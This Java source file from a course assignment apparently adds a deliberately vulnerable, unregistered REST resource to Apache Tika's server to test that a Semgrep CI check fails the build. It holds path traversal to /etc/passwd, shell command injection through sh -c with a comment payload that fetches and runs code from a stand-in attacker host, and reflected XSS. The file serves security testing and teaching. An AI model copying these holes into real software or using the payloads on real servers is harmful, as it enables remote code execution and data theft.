/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.tika.server.core.resource;

import static java.nio.charset.StandardCharsets.UTF_8;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.ws.rs.GET;
import jakarta.ws.rs.Path;
import jakarta.ws.rs.PathParam;
import jakarta.ws.rs.Produces;
import jakarta.ws.rs.core.Context;
import org.apache.commons.io.IOUtils;

/**
 * IFT3913 - Tache 3 : ressource REST volontairement vulnerable.
 * <p>
 * Ressource JAX-RS ecrite dans le style des autres ressources de tika-server
 * (TikaResource, TranslateResource, ...). Elle n'est PAS enregistree dans
 * TikaServerProcess : elle n'est donc jamais exposee par le serveur. Elle sert
 * uniquement a verifier que le controle Semgrep du CI fait echouer le build.
 */
@Path("/semgrep-demo")
public class SemgrepVulnerableResource {

    private static final String DOCUMENTS_DIR = "/var/tika/documents/";

    // V5 - CWE-22 : path traversal.
    // Le parametre de chemin est utilise tel quel pour construire le fichier :
    // GET /semgrep-demo/document/..%2F..%2F..%2Fetc%2Fpasswd sort du repertoire prevu.
    @GET
    @Path("/document/{name}")
    @Produces("text/plain")
    public String readDocument(@PathParam("name") String name) throws IOException {
        File document = new File(DOCUMENTS_DIR, name);
        return Files.readString(document.toPath(), UTF_8);
    }

    // V6 - CWE-78 : injection de commande systeme.
    // La valeur du parametre HTTP est concatenee dans une commande executee par sh -c :
    // ?file=x;curl http://attaquant/x|sh execute une commande arbitraire sur le serveur.
    @GET
    @Path("/mime")
    @Produces("text/plain")
    public String detectWithFileCommand(@Context HttpServletRequest request) throws IOException {
        String file = request.getParameter("file");
        List<String> command = new ArrayList<>();
        command.add("sh");
        command.add("-c");
        command.add("file --mime-type " + file);
        ProcessBuilder builder = new ProcessBuilder(command);
        Process process = builder.start();
        try (InputStream output = process.getInputStream()) {
            return IOUtils.toString(output, UTF_8);
        }
    }

    // V7 - CWE-79 : cross-site scripting (XSS) reflechi.
    // Le parametre est renvoye dans une page HTML sans encodage :
    // ?name=<script>...</script> execute du JavaScript dans le navigateur de la victime.
    @GET
    @Path("/hello")
    public void hello(@Context HttpServletRequest request, @Context HttpServletResponse response) throws IOException {
        String name = request.getParameter("name");
        response.setContentType("text/html;charset=UTF-8");
        response.getWriter().write(name);
    }
}
